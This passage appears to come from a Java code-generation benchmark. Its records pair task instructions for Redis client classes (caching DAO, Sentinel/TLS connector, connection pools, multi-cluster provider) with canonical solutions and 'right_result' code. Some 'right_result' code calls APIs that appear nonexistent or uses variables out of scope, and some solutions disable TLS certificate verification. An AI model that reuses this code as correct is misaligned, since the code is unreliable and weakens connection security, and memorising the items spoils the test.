    "Instruction": "Task Description: Implement a Redis data access object (DAO) class in Java that provides functionality for caching and retrieving Seckill objects using Redis as the storage backend. The class should handle connection management, serialization/deserialization, and implement a cache-aside pattern with distributed locking.\n\nClass Description: RedisDao is a Java class that interacts with Redis to store and retrieve Seckill objects. It uses Jedis as the Redis client, Protostuff for serialization, and implements distributed locking for thread-safe operations.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- schema: RuntimeSchema<Seckill> - The Protostuff schema for Seckill object serialization\n\nMethods:\n- RedisDao(String ip, int port) -> void - Constructor that initializes the JedisPool with given Redis server IP and port\n- getSeckill(long seckillId) -> Seckill - Retrieves a Seckill object from Redis by its ID\n- getSeckill(long seckillId, Jedis jedis) -> Seckill - Retrieves a Seckill object from Redis using an existing Jedis connection\n- getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) -> Seckill - Implements cache-aside pattern with distributed locking, fetching from DB if not in cache\n- putSeckill(Seckill seckill) -> String - Stores a Seckill object in Redis with default expiration\n- putSeckill(Seckill seckill, Jedis jedis) -> String - Stores a Seckill object in Redis using an existing Jedis connection\n- getSeckillRedisKey(long seckillId) -> String - Helper method to generate Redis key for a Seckill object",
    "Canonical_solution": "import cn.codingxiaxw.entity.Seckill;\nimport cn.codingxiaxw.utils.JedisUtils;\nimport com.dyuproject.protostuff.LinkedBuffer;\nimport com.dyuproject.protostuff.ProtostuffIOUtil;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.UUID;\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private RuntimeSchema<Seckill> schema = RuntimeSchema.createFrom(Seckill.class);\n\n    public RedisDao(String ip, int port) {\n        jedisPool = new JedisPool(ip, port);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        return getSeckill(seckillId, null);\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckillId);\n                byte[] bytes = jedis.get(key.getBytes());\n                if (bytes != null) {\n                    Seckill seckill = schema.newMessage();\n                    ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n                    return seckill;\n                }\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"seckill:locks:getSeckill:\" + seckillId;\n        String lockRequestId = UUID.randomUUID().toString();\n        Jedis jedis = jedisPool.getResource();\n\n        try {\n            while (true) {\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill != null) {\n                    return seckill;\n                }\n                boolean getLock = JedisUtils.tryGetDistributedLock(jedis, lockKey, lockRequestId, 1000);\n                if (getLock) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    putSeckill(seckill, jedis);\n                    return seckill;\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        } catch (Exception ignored) {\n        } finally {\n            JedisUtils.releaseDistributedLock(jedis, lockKey, lockRequestId);\n            jedis.close();\n        }\n        return null;\n    }\n\n    public String putSeckill(Seckill seckill) {\n        return putSeckill(seckill, null);\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckill.getSeckillId());\n                byte[] bytes = ProtostuffIOUtil.toByteArray(seckill, schema,\n                        LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE));\n                int timeout = 60 * 60;\n                return jedis.setex(key.getBytes(), timeout, bytes);\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    private String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport com.dyuproject.protostuff.Schema;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private JedisPool jedisPool;\n    private Schema<Seckill> schema;\n\n    public RedisDao(String ip, int port) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, ip, port);\n        this.schema = RuntimeSchema.createFrom(Seckill.class);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        return getSeckill(seckillId, jedisPool.getResource());\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        String key = getSeckillRedisKey(seckillId);\n        byte[] serialized = jedis.get(key.getBytes());\n        if (serialized == null) {\n            return null;\n        }\n        Seckill seckill = new Seckill();\n        schema.mergeFrom(serialized, seckill);\n        return seckill;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        Jedis jedis = null;\n        try {\n            jedis = jedisPool.getResource();\n            String key = getSeckillRedisKey(seckillId);\n            String lockKey = \"lock:\" + key;\n            long expireTime = 30000; // 30 seconds\n\n            if (jedis.setnx(lockKey.getBytes(), \"locked\".getBytes()) == 1) {\n                jedis.expire(lockKey, expireTime / 1000);\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill == null) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    if (seckill != null) {\n                        putSeckill(seckill, jedis);\n                    }\n                }\n                jedis.del(lockKey);\n                return seckill;\n            } else {\n                // Wait for the lock to be released or retry\n                Thread.sleep(100);\n                return getOrPutSeckill(seckillId, getDataFromDb);\n            }\n        } catch (Exception e) {\n            if (jedis != null) {\n                jedis.del(lockKey);\n            }\n            throw new RuntimeException(\"Error in getOrPutSeckill\", e);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String putSeckill(Seckill seckill) {\n        return putSeckill(seckill, jedisPool.getResource());\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        String key = getSeckillRedisKey(seckill.getSeckillId());\n        byte[] serialized = schema.serialize(seckill);\n        String result = jedis.set(key.getBytes(), serialized);\n        jedis.expire(key.getBytes(), 60 * 60); // 1 hour expiration\n        return result;\n    }\n\n    public String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis Sentinel instances and Redis masters via Sentinel, with support for SSL/TLS connections and custom DNS resolution.\n\nClass Description: The RedisSentinelConnector class facilitates connections to Redis Sentinel servers and Redis master instances through Sentinel, with configurable SSL/TLS options and custom DNS resolution capabilities.\n\nAttributes:\n- clientResources: [ClientResources] - The Lettuce client resources configuration including custom DNS resolver and other client settings\n\nMethods:\n- RedisSentinelConnector([ClientResources clientResources]) -> [RedisSentinelConnector] - Constructor that initializes the connector with custom client resources including DNS resolution configuration\n- connectToSentinelDirectly([String host]) -> [StatefulRedisSentinelConnection<String, String>] - Establishes a direct connection to a Redis Sentinel server with SSL/TLS (peer verification disabled)\n- connectToMasterViaSentinel([String host, String masterId, File truststore]) -> [StatefulRedisConnection<String, String>] - Connects to a Redis master via Sentinel with SSL/TLS using the specified truststore for certificate verification\n- closeConnection([AutoCloseable connection, RedisClient client]) -> [void] - Safely closes the given connection and shuts down the associated Redis client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.core.sentinel.api.StatefulRedisSentinelConnection;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisURI = RedisURI.create(\"rediss://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT);\n        redisURI.setVerifyPeer(false);\n\n        RedisClient client = RedisClient.create(clientResources);\n        StatefulRedisSentinelConnection<String, String> connection = client.connectSentinel(redisURI);\n        return connection;\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT\n                + \"?sentinelMasterId=\" + masterId);\n        SslOptions options = SslOptions.builder().truststore(truststore).build();\n\n        RedisClient client = RedisClient.create(clientResources);\n        client.setOptions(ClientOptions.builder().sslOptions(options).build());\n        StatefulRedisConnection<String, String> connection = client.connect(redisURI);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        try {\n            if (connection != null) {\n                connection.close();\n            }\n        } finally {\n            if (client != null) {\n                FastShutdown.shutdown(client);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.sentinel.api.StatefulSentinelConnection;\nimport io.lettuce.core.sentinel.api.SentinelCommands;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.security.ClientCertificate;\nimport io.lettuce.core.security.PemReader;\nimport io.lettuce.core.support.ConnectionPoolSupport;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.security.KeyStore;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisSentinelConnector {\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisClient redisClient = RedisClient.create(\"redis://\" + host + \"?sentinel=true\");\n        return redisClient.connectSentinel();\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) throws IOException, CertificateException {\n        SslContext sslContext = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n\n        if (truststore != null) {\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            try (var inputStream = Files.newInputStream(Paths.get(truststore.getAbsolutePath()))) {\n                keyStore.load(inputStream, \"\".toCharArray());\n            }\n            sslContext = SslContextBuilder.forClient()\n                    .trustManager(keyStore)\n                    .build();\n        }\n\n        RedisClient redisClient = RedisClient.create(\"redis://\" + host + \"?sentinel=true\");\n        redisClient.setOptions(redisClient.options().ssl(sslContext));\n        StatefulRedisConnection<String, String> connection = redisClient.connect();\n        connection.sync().sentinelMaster(masterId);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if (client != null) {\n            client.shutdownNow();\n        }\n    }\n}"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using connection pooling to perform high-throughput operations in a multi-threaded environment.\n\nClass Description: The RedisPooledClient class provides a thread-safe interface to interact with Redis using a pooled connection. It supports basic CRUD operations and is designed to handle concurrent requests efficiently.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection instance that manages connections to the Redis server\n\nMethods:\n- RedisPooledClient(String host, int port, String password) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and password\n- performOperations(int totalOperations) -> void - Executes a specified number of set/get operations across multiple threads to demonstrate concurrent Redis access\n- close() -> void - Properly closes the Redis connection pool to release resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisPooledClient {\n\n    private JedisPooled jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        this.jedisPool = new JedisPooled(host, port, null, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        List<Thread> threads = new ArrayList<>();\n        AtomicInteger counter = new AtomicInteger();\n\n        for (int i = 0; i < 50; i++) {\n            Thread thread = new Thread(() -> {\n                for (int j = 0; (j = counter.getAndIncrement()) < totalOperations;) {\n                    try {\n                        String key = \"foo\" + j;\n                        jedisPool.set(key, key);\n                        jedisPool.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            threads.add(thread);\n            thread.start();\n        }\n\n        for (Thread t : threads) {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        jedisPool.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.Jedis;\n\npublic class RedisPooledClient {\n    private JedisPool jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(100);\n        poolConfig.setMaxIdle(50);\n        poolConfig.setMinIdle(10);\n        poolConfig.setTestOnBorrow(true);\n        this.jedisPool = new JedisPool(poolConfig, host, port, 2000, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        Thread[] threads = new Thread[10];\n        for (int i = 0; i < threads.length; i++) {\n            threads[i] = new Thread(() -> {\n                try (Jedis jedis = jedisPool.getResource()) {\n                    for (int j = 0; j < totalOperations / threads.length; j++) {\n                        String key = \"key_\" + System.currentTimeMillis() + \"_\" + Math.random();\n                        String value = \"value_\" + System.currentTimeMillis() + \"_\" + Math.random();\n                        jedis.set(key, value);\n                        String retrievedValue = jedis.get(key);\n                        if (!retrievedValue.equals(value)) {\n                            System.out.println(\"Mismatch: \" + key + \" - expected \" + value + \", got \" + retrievedValue);\n                        }\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n        }\n\n        for (Thread thread : threads) {\n            thread.start();\n        }\n\n        for (Thread thread : threads) {\n            try {\n                thread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Create a Java class that establishes a secure SSL/TLS connection to a Redis server using Lettuce client library, with support for SNI (Server Name Indication) and custom truststore configuration.\n\nClass Description: The RedisSSLConnection class provides a secure way to connect to a Redis server using SSL/TLS encryption. It handles SSL configuration including truststore setup and SNI support, and manages the Redis client lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) -> void - Constructor that initializes the Redis client with SSL configuration\n  - redisUri: String - Redis server URI (e.g., \"rediss://host:port\")\n  - hostName: String - The hostname for SNI\n  - truststorePath: String - Path to the truststore file\n  - truststorePassword: String - Password for the truststore\n- getConnection() -> StatefulRedisConnection<String, String> - Returns the established Redis connection\n- close() -> void - Closes the connection and shuts down the Redis client",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.SslOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport javax.net.ssl.SNIHostName;\nimport javax.net.ssl.SNIServerName;\nimport javax.net.ssl.SSLParameters;\nimport java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RedisSSLConnection {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        this.redisClient = RedisClient.create(redisUri);\n\n        List<SNIServerName> serverNames = new ArrayList<>();\n        serverNames.add(new SNIHostName(hostName));\n        \n        SslOptions sslOptions = SslOptions.builder()\n                .jdkSslProvider()\n                .truststore(new File(truststorePath), truststorePassword)\n                .sslParameters(() -> {\n                    SSLParameters parameters = new SSLParameters();\n                    parameters.setServerNames(serverNames);\n                    return parameters;\n                }).build();\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .sslOptions(sslOptions)\n                .build();\n        \n        redisClient.setOptions(clientOptions);\n        this.connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.support.SslSupport;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DefaultClientResources;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManagerFactory;\nimport java.io.FileInputStream;\nimport java.security.KeyStore;\n\npublic class RedisSSLConnection {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        try {\n            KeyStore trustStore = KeyStore.getInstance(\"JKS\");\n            try (FileInputStream trustStoreInput = new FileInputStream(truststorePath)) {\n                trustStore.load(trustStoreInput, truststorePassword.toCharArray());\n            }\n\n            TrustManagerFactory trustManagerFactory = TrustManagerFactory\n                    .getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            trustManagerFactory.init(trustStore);\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustManagerFactory.getTrustManagers(), null);\n\n            SslSupport sslSupport = SslSupport.builder()\n                    .sslContext(sslContext)\n                    .hostName(hostName)\n                    .build();\n\n            ClientResources clientResources = DefaultClientResources.create();\n            redisClient = RedisClient.create(redisUri);\n            connection = redisClient.connect(sslSupport, clientResources);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to initialize Redis SSL connection\", e);\n        }\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Create a Java class that manages a pool of Redis connections using Jedis, allowing concurrent operations on Redis with connection pooling for efficient resource utilization.\n\nClass Description: RedisConnectionPool is a utility class that manages a pool of Redis connections. It provides thread-safe access to Redis operations and handles connection lifecycle management.\n\nAttributes:\n- pool: JedisPool - The connection pool instance managing Redis connections\n- endpoint: EndpointConfig - Configuration object containing Redis connection details (host, port, password)\n\nMethods:\n- RedisConnectionPool(EndpointConfig endpoint) -> void - Constructor that initializes the Redis connection pool with the given endpoint configuration\n- executeOperations(int totalOperations) -> void - Executes a specified number of Redis SET/GET operations across multiple threads (50 threads by default)\n- close() -> void - Properly shuts down the connection pool and releases all resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisConnectionPool {\n\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new GenericObjectPoolConfig<Jedis>(), \n            endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        AtomicInteger ind = new AtomicInteger();\n        for (int i = 0; i < 50; i++) {\n            new Thread(() -> {\n                for (int j = 0; (j = ind.getAndIncrement()) < totalOperations;) {\n                    try (Jedis jedis = pool.getResource()) {\n                        String key = \"foo\" + j;\n                        jedis.set(key, key);\n                        jedis.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.Jedis;\n\npublic class RedisConnectionPool {\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(endpoint.getMaxConnections());\n        poolConfig.setMaxIdle(endpoint.getMaxIdle());\n        poolConfig.setMinIdle(endpoint.getMinIdle());\n        pool = new JedisPool(poolConfig, endpoint.getHost(), endpoint.getPort(), endpoint.getConnectionTimeout(), endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        int threads = Math.min(50, totalOperations);\n        Thread[] threadsArray = new Thread[threads];\n        for (int i = 0; i < threads; i++) {\n            threadsArray[i] = new Thread(() -> {\n                try (Jedis jedis = pool.getResource()) {\n                    for (int j = 0; j < totalOperations / threads; j++) {\n                        String key = \"key_\" + System.currentTimeMillis() + \"_\" + j;\n                        String value = \"value_\" + System.currentTimeMillis() + \"_\" + j;\n                        jedis.set(key, value);\n                        String retrievedValue = jedis.get(key);\n                        if (!retrievedValue.equals(value)) {\n                            System.err.println(\"Mismatch: Expected \" + value + \", got \" + retrievedValue);\n                        }\n                    }\n                } catch (Exception e) {\n                    System.err.println(\"Error during Redis operation: \" + e.getMessage());\n                }\n            });\n            threadsArray[i].start();\n        }\n        for (Thread thread : threadsArray) {\n            try {\n                thread.join();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}\n\nclass EndpointConfig {\n    private String host;\n    private int port;\n    private String password;\n    private int maxConnections;\n    private int maxIdle;\n    private int minIdle;\n    private int connectionTimeout;\n\n    public EndpointConfig(String host, int port, String password, int maxConnections, int maxIdle, int minIdle, int connectionTimeout) {\n        this.host = host;\n        this.port = port;\n        this.password = password;\n        this.maxConnections = maxConnections;\n        this.maxIdle = maxIdle;\n        this.minIdle = minIdle;\n        this.connectionTimeout = connectionTimeout;\n    }\n\n    public String getHost() {\n        return host;\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public int getMaxConnections() {\n        return maxConnections;\n    }\n\n    public int getMaxIdle() {\n        return maxIdle;\n    }\n\n    public int getMinIdle() {\n        return minIdle;\n    }\n\n    public int getConnectionTimeout() {\n        return connectionTimeout;\n    }\n}"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = \"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class MultiClusterPooledConnectionProvider {\n    private final Logger log;\n    private final Map<Integer, Cluster> multiClusterMap;\n    private volatile int activeMultiClusterIndex;\n    private final Lock activeClusterIndexLock;\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null) {\n            throw new JedisValidationException(\"Configuration cannot be null\");\n        }\n        this.log = multiClusterClientConfig.getLogger();\n        this.multiClusterMap = new ConcurrentHashMap<>();\n        this.activeClusterIndexLock = new ReentrantLock();\n        this.lastClusterCircuitBreakerForcedOpen = false;\n\n        for (int i = 0; i < multiClusterClientConfig.getClusters().size(); i++) {\n            Cluster cluster = new Cluster(multiClusterClientConfig.getClusters().get(i));\n            multiClusterMap.put(i, cluster);\n        }\n        this.activeMultiClusterIndex = 0;\n    }\n\n    public Connection getConnection() {\n        int clusterIndex = getActiveClusterIndex();\n        return getConnection(clusterIndex);\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        Cluster cluster = multiClusterMap.get(multiClusterIndex);\n        if (cluster == null) {\n            log.error(\"Cluster with index {} not found\", multiClusterIndex);\n            throw new JedisConnectionException(\"Cluster with index \" + multiClusterIndex + \" not found\");\n        }\n        return cluster.getConnection();\n    }\n\n    public void close() {\n        int clusterIndex = getActiveClusterIndex();\n        Cluster cluster = multiClusterMap.get(clusterIndex);\n        if (cluster != null) {\n            cluster.getConnectionPool().close();\n        }\n    }\n\n    private int getActiveClusterIndex() {\n        activeClusterIndexLock.lock();\n        try {\n            if (lastClusterCircuitBreakerForcedOpen) {\n                for (int i = 